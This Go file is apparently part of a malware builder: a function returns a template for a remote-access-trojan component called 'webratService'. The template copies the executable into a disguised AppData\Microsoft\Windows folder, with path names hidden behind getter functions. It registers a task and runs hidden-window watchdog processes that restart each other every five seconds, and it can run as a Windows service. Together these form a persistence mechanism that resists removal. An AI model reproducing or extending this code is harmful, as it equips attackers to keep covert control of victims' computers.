package buildergen

import "strings"

func templateProcess() string {
	return strings.TrimSpace(`
const stillActive uint32 = 259

type webratService struct{}

func isProcessRunning(pid int) bool {
	if pid <= 0 {
		return false
	}
	h, err := windows.OpenProcess(windows.PROCESS_QUERY_LIMITED_INFORMATION, false, uint32(pid))
	if err != nil {
		return false
	}
	defer windows.CloseHandle(h)
	var code uint32
	if err := windows.GetExitCodeProcess(h, &code); err != nil {
		return false
	}
	return code == stillActive
}

func (s *webratService) Execute(args []string, r <-chan svc.ChangeRequest, changes chan<- svc.Status) (bool, uint32) {
	const accepted = svc.AcceptStop | svc.AcceptShutdown
	changes <- svc.Status{State: svc.StartPending}

	workerPath := filepath.Join(os.Getenv(getAppDataEnvName()), getMicrosoftDirName(), getWindowsDirName(), getWorkerExeName())

	servicePid := os.Getpid()
	workerPid := 0
	startWorker := func() int {
		cmd := exec.Command(workerPath, "worker", strconv.Itoa(servicePid))
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		if err := cmd.Start(); err != nil {
			return 0
		}
		return cmd.Process.Pid
	}

	go func() {
		for {
			time.Sleep(5 * time.Second)
			if !isProcessRunning(workerPid) {
				workerPid = startWorker()
			}
		}
	}()

	changes <- svc.Status{State: svc.Running, Accepts: accepted}

	for {
		select {
		case c := <-r:
			switch c.Cmd {
			case svc.Interrogate:
				changes <- c.CurrentStatus
			case svc.Stop, svc.Shutdown:
				changes <- svc.Status{State: svc.StopPending}
				return false, 0
			}
		}
	}
}

func runPrimaryWithWorker() {
	exePath, err := os.Executable()
	if err != nil {
		loopA()
		return
	}
	workerDir := filepath.Join(os.Getenv(getAppDataEnvName()), getMicrosoftDirName(), getWindowsDirName())
	workerPath := filepath.Join(workerDir, getWorkerExeName())

	if err := os.MkdirAll(workerDir, 0755); err == nil {
		_ = copyFile(exePath, workerPath)
	} else {
		workerPath = exePath
	}

	opSetupTask(workerPath)

	startWorker := func(primaryPid int) int {
		cmd := exec.Command(workerPath, "worker", strconv.Itoa(primaryPid))
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		if err := cmd.Start(); err != nil {
			return 0
		}
		return cmd.Process.Pid
	}

	primaryPid := os.Getpid()
	workerPid := startWorker(primaryPid)

	go func() {
		for {
			time.Sleep(5 * time.Second)
			if !isProcessRunning(workerPid) {
				workerPid = startWorker(primaryPid)
			}
		}
	}()

	loopA()
}

func runWorkerGuard() {
	primaryPid := 0
	if len(os.Args) > 2 {
		if v, err := strconv.Atoi(os.Args[2]); err == nil && v > 0 {
			primaryPid = v
		}
	}
	exePath, err := os.Executable()
	if err != nil {
		return
	}

	if primaryPid == 0 {
		loopA()
		return
	}

	restartPrimary := func() int {
		cmd := exec.Command(exePath)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		if err := cmd.Start(); err != nil {
			return 0
		}
		return cmd.Process.Pid
	}

	for {
		time.Sleep(5 * time.Second)
		if !isProcessRunning(primaryPid) {
			primaryPid = restartPrimary()
		}
	}
}
`)
}